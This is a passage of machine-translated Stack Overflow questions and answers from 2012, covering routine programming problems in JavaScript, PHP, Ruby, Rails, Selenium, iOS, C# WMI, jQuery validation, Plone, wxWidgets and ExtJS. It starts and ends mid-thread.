
## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T06:20:58.147

在关卡上使用`keydown`处理程序`document`：

```
document.onkeydown = function(e){
 if (e.keyCode===8) {
   return false;
 }
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-25T17:03:58.620

完全防止退格键可能不是一个好主意，假设您打错字并想在文本框中修复它！**因此，只有**当有人没有输入文本输入时，您才需要禁用退格！

这可能适用于所有主要浏览器：

```
document.onkeydown = function (e) {
    e = e || window.event;
    if (e.keyCode == 8) {                                           // Disable Backspace
        var el = document.activeElement;
        if (!((el.nodeName == "INPUT" && (el.type == "text" || el.type == "password")) || el.nodeName == "TEXTAREA")) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }
}; 
```

DOM3 事件模型规范具有*向后兼容性*，因此我认为这可能不是问题，但这是上述代码的 DOM3 修改版本：

```
function KeyDownHandler(e) {
    if (e.keyCode == 8) {                                           // Disable Backspace
        var el = document.activeElement;
        if (!((el.nodeName == "INPUT" && (el.type == "text" || el.type == "password")) || el.nodeName == "TEXTAREA")) {
            e.preventDefault();
            e.stopPropagation();
        }
    }
};

if (document.attachEvent) document.attachEvent("onkeydown", KeyDownHandler);
else document.addEventListener("keydown", KeyDownHandler); 
```

像上面这样的 DOM3 事件注册可能会很痛苦，[John Resig](http://ejohn.org/projects/flexible-javascript-events/)对此有一个很好的实现，但是您可以使用像 JQuery 这样的标准跨浏览器库，它在所有主要浏览器中都可以正常工作！

# php - 如何在 Ruby 中编写 PHP mcrypt_ecb 解密？

> ID：10084629
> 
> 赞同：1
> 
> 时间：2012-04-10T07:16:57.510
> 
> 标签：php, ruby, encryption, mcrypt

```
public static function decryptSessionByDES($str,$key_str){
  $decoded =base64_decode($str);
  $iv = substr($key_str, 0, mcrypt_get_iv_size(MCRYPT_3DES,MCRYPT_MODE_ECB));
  return trim(mcrypt_ecb(MCRYPT_3DES, $key_str, $decoded, MCRYPT_DECRYPT, $iv));
} 
```

如何在 Ruby 中隐藏此代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T01:54:33.243

我解决了这个问题：

这是 libmcrypt 中的 gem 库：[https ://github.com/kingpong/ruby-mcrypt](https://github.com/kingpong/ruby-mcrypt)

```
require "mcrypt"
class Crypt
  def self.decrypt_session_by_des(str, key_str)
    str_decoded = Base64.decode64(str)
    mc = Mcrypt.new(:des,:ecb)
    mc.padding = :pkcs
    mc.key = key_str
    mc.decrypt(str_decoded)
  end
end 
```

其他人解密或加密你可以在 ruby​​-mcrypt 中看到测试用例： [https ://github.com/kingpong/ruby-mcrypt/blob/master/test/test_reciprocity.rb](https://github.com/kingpong/ruby-mcrypt/blob/master/test/test_reciprocity.rb)

# javascript - 如何检查javascript中的当前标签元素？

> ID：10084631
> 
> 赞同：0
> 
> 时间：2012-04-10T07:17:00.647
> 
> 标签：javascript, asp.net

我有一个像这样的三行 GridView

```
<tr>
   <th>SlNo</th>
</tr>
<tr>
   <td>1</td>
</tr>
<tr>
   <td>2</td>
</tr> 
```

我有以下代码遍历行

```
var GridViewRow=GridView.getElementsByTagName('tr') 
```

这里的行长是 3。

我遍历了`GridViewRow`使用 for 循环。这里我将如何获取当前元素的标签名称，即 ( `th or td`)。

如果标记名是“ `TH`”，它应该返回，如果是“ `TD`”，它应该取 TD 的值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:21:45.570

```
var GridViewRow = GridView.getElementsByTagName('tr');
$(GridViewRow).each(function() {
   var $this = $(this), td = $this.find('td');
   if (td.length === 1) {
      console.log(td.text());
   }
}); 
```

如果你使用 jquery，这适用`<tr>`于你只有一个`<td>`，否则在纯 javascript 中试试这个：

```
var GridViewRow = GridView.getElementsByTagName('tr'),
    len = GridViewRow.length,
    td;

    while (--len) {
       td = GridViewRow[len].getElementsByTagName('td');
       if (td.length === 1) {
           console.log(td[0].innerHTML);
       }
    }   
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:22:10.533

这个怎么样

```
var table = document.getElementById("mytab1"); 
for (var i = 0, cell; cell = table.cells[i]; i++) {      
//iterate through cells      
//cells would be accessed using the "cell" variable assigned in the for loop 
} 
```

你也可以试试

```
var tbl = document.getElementById('yourTableId'); 
var rows = tbl.getElementsByTagName('tr'); 
for (var i = 0; i < rows.length; i++) 
{     
    if(rows[i].getElementsByTagName('td').length > 0)
    {
      //code to execute
    }
    else
    {
      continue;
    }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-10T07:29:32.167

您可以使用 jQuery 检查标签名称：

```
$(this).attr("tag"); 
```

后期编辑：

对于原始 javascript，使用[tagName](https://developer.mozilla.org/en/DOM/element.tagName)：

```
element.tagName 
```

# firefox - Webdriver 2.20 和 Firefox 11（无法绑定到锁定端口 7054）

> ID：10084636
> 
> 赞同：6
> 
> 时间：2012-04-10T07:17:21.690
> 
> 标签：firefox, selenium, webdriver

我一直在使用带有 Firefox 3.6 的 WebDriver，它运行良好。我想升级我的 Firefox 并运行我的测试用例。但是由于某种原因，当我尝试创建`FirefoxDriver`.

我就是这样做的。我不使用集线器。

```
driver= new FirefoxDriver(); 
```

我什至尝试使用配置文件。

```
org.openqa.selenium.WebDriverException: Unable to bind to locking port 7054 within 45000 ms
Build info: version: '2.20.0', revision: '16008', time: '2012-02-27 19:03:04'
System info: os.name: 'Windows Vista', os.arch: 'x86', os.version: '6.1', java.version: '1.6.0'
Driver info: driver.version: FirefoxDriver 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:22:53.140

尽管变更[日志](https://code.google.com/p/selenium/source/browse/trunk/java/CHANGELOG)另有说明，但 Selenium 2.20.0 尚未与 FF11 完全兼容。您可以降级到 FF10（或 9，现在不确定 :)），等待 Selenium 2.21.0 出来，或者尝试从那里的主干构建自己的 Selenium。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-10T12:32:44.927

在尝试了此处提供的所有解决方案但没有成功后，我只是完全卸载了 firefox（包括所有配置文件）并按照此处的建议重新安装[https://groups.google.com/forum/#!topic/webdriver/600j__wM0qY](https://groups.google.com/forum/#!topic/webdriver/600j__wM0qY)

这肯定不是一个令人满意的解决方案，而是一个可行的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T09:02:14.530

Even when the 2.20 is not yet fully compatible, it works on my machine with Firefox11\. I am supposing, that you still have Firefox 11 and 3.6 installed at the same time. Maybe you should give a try to this:

```
WebDriver driver = new FirefoxDriver(new File("path/to/firefox11/firefox.exe")); 
```

But however, if it does not work, you had probably bad luck on your machine...

# oracle - 网络中心门户和内容管理

> ID：10084637
> 
> 赞同：0
> 
> 时间：2012-04-10T07:17:23.077
> 
> 标签：oracle, portal, content-management, content-management-system, webcenter

是否可以在不单独购买 WebCenter Content 的情况下使用 WebCenter Portal 来存储和版本化文档（pdf、doc、xls 等）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T10:09:24.283

WebCenter 门户附带有限的 Webacentr 内容许可证，因此您可以在门户中拥有通用内容管理的基础知识

# objective-c - 在 Pantomime 框架中使用 IMAP 在收件箱中显示新邮件

> ID：10084644
> 
> 赞同：1
> 
> 时间：2012-04-10T07:18:00.707
> 
> 标签：objective-c, imap, pantomime

我正在使用 IMAP 创建一个邮件客户端（它是一个使用 Pantomime 框架的 mac 应用程序）。我能够获取所有消息和文件夹等。

当收到新邮件时，它会在用户注销然后再次登录时显示。

收到新邮件时是否会触发任何事件？或者有没有其他方法可以向用户展示新消息？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:22:07.427

您需要触发一个计时器，该计时器将 noop 命令发送到服务器并在设定的时间间隔内重复此操作。然后，如果有新邮件，您将收到来自服务器的新邮件作为响应。然后您可以解析响应并显示给用户。

# ruby-on-rails-3 - 关于 Rack::Timeout 的 2 个问题（rspec + 线程安全）

> ID：10084651
> 
> 赞同：2
> 
> 时间：2012-04-10T07:18:30.503
> 
> 标签：ruby-on-rails-3, rspec, thread-safety

在我的 Rails 应用程序中，我使用[Rack::Timeout](https://github.com/kch/rack-timeout)来解决[此处](https://stackoverflow.com/questions/9976869/timeouts-in-rails-nginx-best-practices)描述的问题。到目前为止工作正常，但我对此有两个问题：

1.  测试超时处理的最佳方法是什么（使用 rspec）？
2.  根据文档，Rack::Timeout 使用线程，所以我必须确保我的应用程序是“线程安全的”。我知道这在理论上意味着什么——我必须确保当两个线程同时对相同的数据进行操作时不会出现问题——但我不确定我必须在哪里确保这一点。我使用的静态数据结构/方法应该没有问题，但我不确定数据库。它（或 ActiveRecord 类）是否需要额外的配置？

# ruby-on-rails - 表单未显示错误消息（Rails 3 项目）

> ID：10084655
> 
> 赞同：0
> 
> 时间：2012-04-10T07:18:52.050
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms

我的提交表单没有显示错误消息...当我填写错误并提交时，它只是刷新。它应该显示错误消息 - 请参阅附加代码 - 但由于某种原因它不是。不知道为什么会这样。

任何建议将不胜感激！

谢谢，

费萨尔

**_FORM.HTML.ERB**

```
<% if @post.errors.any? %>
<div id="error_explanation">
  <h2><%= pluralize(@post.errors.count, "error") %> prohibited this post from being saved:</h2>
<ul>
  <% @post.errors.full_messages.each do |msg| %>
    <li><%= msg %></li>
  <% end %>
  </ul>
</div>
<% end %>

<div class="field">
I am a <%= f.text_field :title %> getting married in <%= f.text_field :job %> in <%= f.text_field :location %>, and looking for a wedding photographer. My budget is <%= f.text_field :salary %>.
</div>

<form>
<div id="first_button">
<button type="button" id="your_button" class="btn span6 large">Submit</button>
</div>

<div id="real_form">
<%=  recaptcha_tags %>
<button type="submit" class="btn span6 large">Submit</button>
</div>​

</form>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.0/jquery.min.js"></script>
<script type="text/javascript">
  $(document).ready(function() {
    $("#real_form").hide(); //this will hide the `real_form` div on page load
    $("#your_button").click(function() {
        $("#real_form").show(); // this will show the `real_form` on clicking of `any_button` button
        $("#first_button").hide(); 
    });
});
</script>
<% end %> 
```

**帖子控制器**

```
def create
@post = Post.new

respond_to do |format|
  if verify_recaptcha
      if @post.save
          format.html { redirect_to :action=> "index"}
          format.json { render :json => @post, :status => :created, :location => @post }
      else
          format.html { render :action => "new" }
          format.json { render :json => @post.errors, :status => :unprocessable_entity }
      end
  else
          flash[:message] = 'Please try filling out Recaptcha again' #added to confirm an error is present
          format.html { render :action => "new" }
          format.json { render :json => @post }
  end
end
end 
```

**后模型**

```
class Post < ActiveRecord::Base
validates :title, :job, :location, :salary, :presence => true 
validates :salary, :numericality => {:greater_than_or_equal_to => 1} 
end 
```

**帖子 > New.Html.Erb 文件**

```
<div class="hero-unit">
<h1>Find wedding photographers with ease.</h1>
<br>
<p>Post your needs and sit back and wait to get responses.</p>
<br>
<%= render 'form' %>
<%= flash[:message] %>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T09:32:18.603

您使用的是 Devise 还是其他身份验证库。

您可能需要在表单中放置一个真实性令牌（尽管这会使您注销而只是重定向，但如果您没有身份验证库，则可能是这种行为）

您还应该使用`form_for @post`以便为您的新函数正确命名您的输入（这将为您放入身份验证令牌）。

您的问题也可能在您的模型中，您可能必须将表单发送的属性列入白名单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T09:27:42.193

当您的表单显示所有错误时，可能还有另一个问题阻止保存模型。确保您可以在 rails 控制台中保存模型。

# php - 带有 Javascript 的 PHP OOP

> ID：10084658
> 
> 赞同：1
> 
> 时间：2012-04-10T07:18:57.927
> 
> 标签：php, javascript, mysql

我正在尝试围绕 PHP OOP 进行思考，在阅读了所有我能理解的内容之后，我完全理解它是如何工作的，但是在我投入太多时间来学习改变我的内联程序习惯之前，我想确保它甚至可以完成我所需要的或者如果我偏离轨道。

我有一个 PHP / MySQL 站点，该站点最初是一个辅助项目，但发展迅速，我正在努力确保我的技能能够跟上。该网站有用户和公司。用户端是相当静态的，我能够用我的新手 PHP 技能处理显示内容的微小变化。在公司方面，我试图为他们喜欢的公司定制它，但我很快意识到我遇到了问题，因为现在每个公司有 50 页代码正在被修改，然后根据公司想要的内容转储到文件夹中在他们的网站上。因此，每次有公司加入时，我都会将以前的公司文件复制到我的 Web 根目录中的一个新文件夹中，并为他们定制了一堆东西。一世' 我已经在大多数页面中添加了一些功能，以将页面数量缩小到大约 20 个，但我的问题是 OOP 是否可以让我一路回到我只维护一个站点的地方，这就是 OOP 的目的吗？我有像 javascript（如下所示）这样的东西，它们会根据客户在他们的网格系统中的需求而变化。有人可以帮助我了解我应该在这里学习的基础知识吗？我应该学习使每个页面成为一个大对象并在该对象中包含下面的 javascript，还是仅适用于 PHP 的 OOP，并且每次客户来访时，我都会被至少几页代码困在一个新文件夹中或我只是限制可以定制的内容吗？我不害怕学习新东西，只是想确保我走在正确的轨道上，而且我所处的洞很快就会变得更深，所以时间很短。感谢您对这个概念的任何帮助。我觉得我缺少一些基本的理解......

```
var mygrid;         
            function doInitGrid(){  
            mygrid = new dhtmlXGridObject('gridbox');
            var combo=mygrid.getCombo(4);
            combo.put(2, 'Approve / Deny');
            combo.put(1, 'Approve');
            combo.put(0, 'Deny');
            mygrid.setImagePath("../codebase/imgs/");           
            mygrid.setHeader("Submit Date, Manufacturer, Product Category, Progress, Approval Status",null,["text-align:center;","text-align:center;","text-align:center","text-align:center","text-align:center"]);        
            <!--mygrid.attachHeader("#text_filter,#text_filter,#text_filter");-->
            mygrid.setInitWidthsP("10,16,44,18,12");
            mygrid.setColAlign("center,left,left,center,center");
            mygrid.enableAutoWidth(false);
            mygrid.setColTypes("ro,ro,ro,button,coro");
            mygrid.setColSorting("str,str,str,str,str,str");
            mygrid.enableRowsHover(true,'grid_hover');              
            mygrid.setSkin("modern");
            mygrid.init();          
            mygrid.setStyle("font-size:11px;","font-size:11px;","font-size:11px","font-size:11px","font-size:11px");
            mygrid.loadXML("connector.php?hospid=<?php echo $hospid; ?>");
            mygrid.setColumnIds("date,man_name,group,approval_progress, approval_status");          
            var dp = new dataProcessor ("connector.php?hospid=<?php echo $hospid; ?>");     
            dp.init(mygrid);                        
            dhxWins = new dhtmlXWindows();
            dhxWins.setImagePath("../codebase/imgs/");          
            mygrid.attachEvent("onRowSelect", function(id,ind){ 
                 if (ind == 0 || ind == 1 || ind == 2 || ind == 3){  
                dhxWins = new dhtmlXWindows();
                var w1 = dhxWins.createWindow("w1", 60, 60,925, 575);
                dhxWins.setSkin("dhx_web");
                dhxWins.setImagePath("../codebase/imgs/");
                w1.centerOnScreen();
                w1.setText("");
                w1.setModal(false);
                theVar11 = (id);
                w1.attachURL("pop_details.php?var1=" +theVar11);
                return true;
                 };
                 }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:35:14.270

我尝试阅读您的问题（啊，文字墙！没有空行，没有要点，没有总结！）据我了解，您最大的问题似乎不是 PHP 和 OOP，而是项目管理。

您正在尝试为 50 家公司管理一个项目，他们都需要一些不同的东西，并且您在代码重用/复制粘贴代码以及更新所有代码方面遇到了问题。

解决方案可能分为**两部分**：对于第一部分，大多数人会建议您使用源代码**版本控制系统**，例如 git、svn 或 cvs。这将允许您对代码进行版本控制、创建分支并合并它们。通过这种方式更新旧代码要容易得多。

代码重用的第二个解决方案确实是**OOP**。您需要决定哪些功能是通用的，应该放在单独的（可重用）模块中，哪些功能是公司特有的，不会被重用。一旦它被重用，将代码分成一个模块。

认为您不是为自己或公司编写代码，而是为必须使用您的代码的其他开发人员团队编写代码可能会有所帮助。分离代码并记录 API。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:34:04.003

嗯

我会说 OOP 在这里非常方便！

首先，您希望将所有 HTML 页面与 PHP 页面分开。为自己减少混乱。

其次，我的 PHP 创建了一个具有主要配置文件功能的父类。这将在以后为您工作，因为您可以将一些参数传递给您的类，这些参数将更新您的用户配置文件的所有相关信息。

在与您似乎倾向于使用的大型站点合作时，作为开发人员的工作将更容易遵循 MVC 系统或创建自己的系统。

作为您的案例的示例，创建一个名为`Profile.class.php`

```
class Profile
{
   public function __construct() {}

   public function updateUser($user)
   {
       // run code to update 1 user here
   }
} 
```

在您的`profile.php`页面中

你可以有类似的东西

```
$obj = new Profile();

if ($_GET['update']) {
   $obj->updateUser($_SESSION['user']);
} 
```

这就是您能够从 OOP 方法中受益的方式。

这是你的选择。

# ios - 如何使用两个不同版本（免费和付费）将我的应用程序添加到应用商店

> ID：10084662
> 
> 赞同：9
> 
> 时间：2012-04-10T07:19:35.700
> 
> 标签：ios, itunes

我将免费发布我的应用程序，但应用程序的某些部分（功能）需要钱。

例如：当用户想从应用程序发送消息时，我的应用程序会说

“你应该购买这个应用程序的完整版”......等等。

我怎样才能做到这一点。我不知道。

**回答**

我终于找到了我要找的东西。这是一篇很好的文章，适合和我一起搜索相同事物的人。谢谢。

[如何创建付费版和精简版 iPhone 应用程序](http://www.raywenderlich.com/68613/create-paid-lite-version-iphone-app)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:45:13.737

您需要为 App Store 创建两个不同的应用程序：免费的和付费的。你可以有，例如：

1.  MyApp Lite（免费）+ MyApp（付费）
2.  MyApp（免费）+ MyApp Pro（付费）

这两个应用程序将共享大量代码，但只有您自己知道。至于 App Store，它们将是两个完全不同且不相关的应用程序。

在您的免费应用程序中，您可以添加警报，其中可以选择包含指向您付费版本的 App Store 页面的链接。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:51:13.187

正如@sergio 指出的那样，您将需要两个完全不同的应用程序。

然而，他们可以——并且希望会——拥有完全相同的代码，除了一行：类似`#define FULL_VERSION`和/或 undef 之类的代码。然后在您的真实代码中，您可以使用s 和s 以及运行/编译代码
来检查宏，具体取决于用户购买的是完整版还是“演示版”。`#ifdef``#endif`

请注意，这种方法不会影响应用程序的运行速度，而 in-app-full-version-purchase 会。

```
 BOOL triesToAccessCoolFeature;
    if (triesToAccessCoolFeature)
    {
#ifdef FULL_VERSION
       coolFeature();
#else
       alert("Buy the full version to access this feature.");
#endif
    } 
```

# c# - 仅使用 WMI 查询获取真正的适配器信息？

> ID：10084668
> 
> 赞同：1
> 
> 时间：2012-04-10T07:20:03.310
> 
> 标签：c#, wmi-query, system.management

我试图使用 WMI 获取一些系统信息，
但问题是当我想获取例如图形卡信息时.. 我有很多驱动程序（真实和虚拟）

```
ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from " + key);
foreach (ManagementObject share in searcher.Get())
{
   Console.WriteLine(share["Name"].ToString());
} 
```

**结果是：**
Radmin Mirror Driver v3
ATI Mobility Radeon HD 5650
LogMeIn Mirror Driver
PCI GDIHOOK5

所以我决定编辑查询以仅获取真实的查询。在这种情况下，真实的查询应该具有不等于 null 的 AdapterRam

```
ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name,AdapterRAM from " + key+" where AdapterRAM is not null");
foreach (ManagementObject share in searcher.Get())
{
   Console.WriteLine(share["Name"].ToString());
   Console.WriteLine(share["AdapterRAM"].ToString());
} 
```

**结果是：**
ATI Mobility Radeon HD 5650
字节数

有没有更好和更通用的方法来只在 WMI 中获取真正的 adpaters？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:44:34.563

未找到，因为您仅`Name`在查询中选择。改用这个：

```
"select * from " + key+" where AdapterRAM is not null" 
```

至于第二个问题，我不确定，但您的内存过滤器似乎工作得很好。

# jquery - jquery验证字数集成

> ID：10084673
> 
> 赞同：0
> 
> 时间：2012-04-10T07:20:35.060
> 
> 标签：jquery, validation, count, word

如何将字数统计集成到 bassistance.de 验证中？例如，我不希望人们输入超过 50 个单词，它应该显示一个错误来指示它。

```
<form action="done.php" method="post" id="mainform"  class="validate">
<textarea name="message" rows="4" id="message"  class="required" ></textarea>   
</form> 
```

这就是我所拥有的，但我不知道从这里去哪里

```
$(document).ready( function() {
$("form.validate").validate({
    submitHandler: function(form) {
               form.submit();
    }
}) 
```

});

在这里的任何帮助将不胜感激，我根本不熟悉这个插件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:30:18.907

根据您认为的平均字长（我仍然落后于 5），我会使用最少的字符数。所以那将是：

```
$("#mainform").validate({
  rules: {
    message: {
      required: true,
      minlength: 250
    }
  }
}); 
```

### 更新：

如果 ajax 是一个选项，您可以使用该`remote`规则。我认为它会遵循以下原则：

```
$("#test").validate({
    rules: {
        message: {
            remote: {
                url: "check_wordcount.php",
                type: "post",
                data: {
                    wordcount: 5
                }
            }
        }
    }
} 
```

我在时间上遇到了一些问题，但我认为其中一些只是我匆忙做的事情，但它确实有效。在这种情况下，远程脚本必须返回`true`元素名称，所以我的 php 脚本如下所示：

```
$message = $_POST['message'];
$wordcount = (int) $_POST['wordcount'];
$valid = (str_word_count($message) >= $wordcount);

echo json_encode(array('message' => $valid)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-12-17T22:17:24.830

这是另一种解决方案，它向验证器添加了自定义规则，这是一种简单、可重用、干净的方式来完成工作。

```
$.validator.addMethod("wordCount", function(value, element, wordCount) {

    return value.split(' ').length <= wordCount;

}, 'Exceeded word count');'Exceeded word count of ' + len + ' or less'); 
```

如何使用它

```
rules: {
  fieldName: { 
    required: true,
    wordCount: 300
  }
},
messages: {
  fieldName: { 
    required: 'Statement of justification is required',
    wordCount:'Please shorten to 300 words or less.'
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:27:29.087

通过[http://roshanbh.com.np/2008/10/jquery-plugin-word-counter-textarea.html](http://roshanbh.com.np/2008/10/jquery-plugin-word-counter-textarea.html)

或者如果您只想计算字长，请使用

```
 var myLength = $("#myTextbox").val().length; 
```

$("#mytextbox") 通过 id 查找文本框。

.val() 获取用户输入的输入元素的值，是一个字符串。

.length 获取字符串中的字符数。并且无论如何您都可以检查它并发出警报消息。

# plone - 显示在 Plone 中对文档进行最后修改的用户

> ID：10084684
> 
> 赞同：0
> 
> 时间：2012-04-10T07:21:20.050
> 
> 标签：plone

我试图找出最后更改文档的用户是谁。最好，我想根据此信息进行收藏...我能找到的只是修改日期...

使用[此链接](http://plone.org/documentation/kb/view-an-objects-catalog-information)中的脚本，我似乎没有在元数据中找到有关最后一个用户的信息。

这是正确的（没有修改用户信息......），如果是这样，可以做到吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-12T06:29:05.257

正如@MikkoOhtamaa 所写，Plone 默认情况下不会将最后一个修饰符保存在对象上。但是[Plone 确实默认](http://plone.org/documentation/manual/plone-4-user-manual/managing-content/versioning-plone-v3.3)为页面、新闻项目、事件和链接启用了版本控制（由 CMFEditions 提供），并且版本元数据具有最新修饰符的信息。

如果可以从版本元数据中读取信息并仅针对版本控制的内容类型限制该功能，我认为，您需要

1.  [注册一个新索引](http://collective-docs.readthedocs.org/en/latest/searching_and_indexing/indexing.html#adding-index-using-add-on-product-installer)（`catalog.xml`在您的附加组件的 Generic Setup -profile 中使用；您可能还想注册一个元数据列以在结果中返回索引数据）：

    ```
    <?xml version="1.0"?>
    <object name="portal_catalog" meta_type="Plone Catalog Tool">
      <index name="last_modifier" meta_type="FieldIndex">
        <indexed_attr value="last_modifier"/>
      </index>
      <column value="last_modifier"/>
    </object> 
    ```

2.  [注册要在主题集合中](http://plone.org/documentation/kb/enable-collection-indices-fields-for-searching-for-custom-types)使用的自定义搜索条件（`portal_atct.xml`在您的附加组件的 Generic Setup -profile 中使用）和元数据列以获取其表格视图中列出的信息：

    ```
    <?xml version="1.0"?>
    <atcttool>
      <topic_indexes>
        <index name="last_modifier"
              description="The last user, who has modified the object"
              friendlyName="Last Modifier"
              enabled="True">
          <criteria>ATCurrentAuthorCriterion</criteria>
          <criteria>ATListCriterion</criteria>
          <criteria>ATSimpleStringCriterion</criteria>
        </index>
      </topic_indexes>
      <topic_metadata>
        <metadata name="last_modifier"
                  description="The last user, who has modified the object"
                  friendlyName="Last Modifier"
                  enabled="True"/>
      </topic_metadata>
    </atcttool> 
    ```

3.  [编写一个自定义索引器](http://collective-docs.readthedocs.org/en/latest/searching_and_indexing/indexing.html#custom-index-methods)，它从版本元数据中[查找最后一个修饰符并对其进行索引：](http://collective-docs.readthedocs.org/en/latest/content/history.html#getting-the-complete-revision-history-for-an-object)

    ```
    # -*- coding: utf-8 -*-
    """Last modifier indexer"""

    from zope.component import getUtility

    from plone.indexer import indexer

    from Products.CMFCore.interfaces import ISiteRoot, IContentish
    from Products.CMFCore.utils import getToolByName

    @indexer(IContentish)
    def indexLastModifier(context):
        try:
            creator = context.Creators()[0]  # fallback value
        except AttributeError:
            creator = None
        except IndexError:
            creator = None

        site = getUtility(ISiteRoot)
        rt = getToolByName(site, "portal_repository")

        if rt is None or not rt.isVersionable(context):
            # not versionable; fallback to the creator
            return creator

        history = rt.getHistoryMetadata(context)
            if not history:
            # empty history; fallback to the creator
            return creator

        if not rt.isUpToDate(context):
            # history not up-to-date; fallback to the authenticated user
            mtool = getToolByName(site, "portal_membership")
            if mtool.isAnonymousUser():
                # no authenticated user found; fallback to the creator
                return creator
            else:
                return mtool.getAuthenticatedMember().getId()

        length = history.getLength(countPurged=False)

        last = history.retrieve(length - 1)
        if not last or type(last) != dict:
            # unexpected version metadata; fallback to the creator
            return creator

        metadata = last.get("metadata")
        if not metadata or type(metadata) != dict:
            # unexpected version metadata; fallback to the creator
            return creator

        sys_metadata = metadata.get("sys_metadata")
        if not sys_metadata or type(sys_metadata) != dict:
            # unexpected version metadata; fallback to the creator
            return creator

        principal = sys_metadata.get("principal")
        if not principal or type(principal) != str:
            # unexpected version metadata; fallback to the creator
            return creator

        return principal 
    ```

4.  并在您的附加组件中注册索引器`configure.zcml`：

    ```
    <adapter name="last_modifier"
             factory=".indexers.indexLastModifier" /> 
    ```

但是请注意，因为版本控制机制是由与目录索引器相同的事件触发的，所以当我们被调用来索引它时，我们可能不确定是否存在最新版本的元数据。上面，我应用了虚拟启发式方法，当存储库说版本历史元数据与要索引的对象相比已过时时，我改为索引当前用户的用户名（并期望该用户只是在编辑文档）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T08:49:49.053

[http://developer.plone.org/content/history.html#getting-the-complete-revision-history-for-an-object](http://developer.plone.org/content/history.html#getting-the-complete-revision-history-for-an-object)

拥有您需要的有关文档历史记录的所有信息。您还可以单击文档标题下方的“历史记录”查看信息。

# wxwidgets - wxBufferedPaintDC GetGraphicsContext 返回 NULL 指针

> ID：10084687
> 
> 赞同：0
> 
> 时间：2012-04-10T07:21:26.537
> 
> 标签：wxwidgets

为了消除闪烁，我使用 wxBufferedPaintDC 代替 wxPaintDC。但是问题来了。在我的绘图函数中，为了绘制三次贝泽曲线，我必须使用 GetGraphicsContext 创建路径。我的问题是为什么 GetGraphicsContext 在使用 wxBufferedPaintDC 时返回一个 NULL 指针。

```
void DotGraphView::OnPaint(wxPaintEvent & WXUNUSED(evt))
{
    wxBufferedPaintDC dc(this);

    PrepareDC(dc);

    PaintBackground(dc);

    wxGCDC &gdc = (wxGCDC&)dc;
    wxGraphicsContext * gc = gdc.GetGraphicsContext(); /* here gc = NULL */
    wxGraphicsPath path = gc->CreatePath(); /* program collapses here */

    ...
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T07:28:44.550

你从`wxBufferedPaintDC`to的演员表`wxGCDC`对我来说有点可疑，[wxGraphicsContext](http://docs.wxwidgets.org/trunk/classwx_graphics_context.html) 页面建议这样做：

```
wxGraphicsContext *gc = wxGraphicsContext::Create( dc );
if (gc)
{
    //drawing code here
    delete gc;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:26:12.650

我也觉得可疑，建议页面不起作用。现在我使用以下代码，程序运行正常。

```
wxBufferedPaintDC pdc(this);

wxGCDC gdc;
wxGraphicsRenderer * const renderer = wxGraphicsRenderer::GetDefaultRenderer();
wxGraphicsContext * context = renderer->CreateContext(pdc);
gdc.SetGraphicsContext(context);

wxDC & dc = (wxDC &)gdc;
PrepareDC(dc);

Draw(dc);

... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-05T20:24:23.897

您应该使用 wxAutoBufferedPaintDC。在某些平台（如 GTK）上不需要缓冲。

然后，您可以使用构造函数

```
wxGCDC gcdc(dc); 
```

这至少适用于 GTK 和 MSW。

# extjs - 如何防止 extjs 模型/代理在创建时保存空的主 ID

> ID：10084688
> 
> 赞同：2
> 
> 时间：2012-04-10T07:21:41.967
> 
> 标签：extjs

我已经用 REST 代理定义了我的模型。它适用于读取 (GET) 和更新 (PUT)，因为这些操作需要主 ID。当我执行创建操作（POST）时，代理会将所有字段（包括空的主 ID）发送到服务器，这会导致服务器上出现错误。服务器期望创建操作不包含主 ID。我如何指示 extjs 不发送空的主 id 值？IE。“{'model_id':'',...}”？

```
Ext.define('model', {
    extend : 'Ext.data.Model',
    idProperty : 'model_id',
    fields : ['model_id', 'first', 'last'],
    proxy : {
         type : 'rest'
    }
});

var mymodel = Ext.create('model',{last:'digler'});
mymodel.save() //posts "{ 'model_id':'', 'last':'digler'}"? 
```

我希望它在创建时根本不包含主 id 字段。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T11:03:06.830

我认为这是改变请求结构的错误方法。在使用 REST 的情况下，操作创建、更新请求的责任完全在服务器端。

如果您在创建请求开始时仍想更改参数，您可以通过“beforerequest”事件来完成：

```
Ext.Ajax.on("beforerequest", function( conn, options, eOpts){
  if (options.action=='create')
  {
    var newData = 
           {'name': options.jsonData.name, 'email': options.jsonData.email }; 
    options.jsonData = newData;
  }
